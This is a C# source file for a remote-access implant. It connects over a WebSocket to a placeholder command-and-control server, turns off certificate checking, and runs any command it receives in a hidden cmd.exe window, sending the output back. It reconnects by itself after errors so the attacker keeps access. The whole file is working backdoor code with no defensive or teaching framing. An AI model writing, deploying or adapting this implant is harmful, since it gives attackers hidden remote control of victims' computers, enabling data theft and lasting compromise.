using System;
using System.IO;
using System.Net.WebSockets;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private static readonly Uri serverUri = new Uri("wss://address:443");

    static async Task Main()
    {
        try
        {
            
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;

            using (ClientWebSocket ws = new ClientWebSocket())
            {
                await ws.ConnectAsync(serverUri, CancellationToken.None);
                Console.WriteLine("[*] Connected to C2 Server");

                while (ws.State == WebSocketState.Open)
                {
                    var buffer = new byte[1024];
                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "Client closing", CancellationToken.None);
                        break;
                    }

                    string cmd = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    string output = ExecuteCommand(cmd);
                    byte[] response = Encoding.UTF8.GetBytes(output);
                    await ws.SendAsync(new ArraySegment<byte>(response), WebSocketMessageType.Text, true, CancellationToken.None);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error: " + ex.Message);
            await Task.Delay(5000);
            await Main();
        }
    }

    static string ExecuteCommand(string command)
    {
        try
        {
            var process = new System.Diagnostics.Process()
            {
                StartInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }
        catch (Exception ex)
        {
            return "Error executing command: " + ex.Message;
        }
    }
}
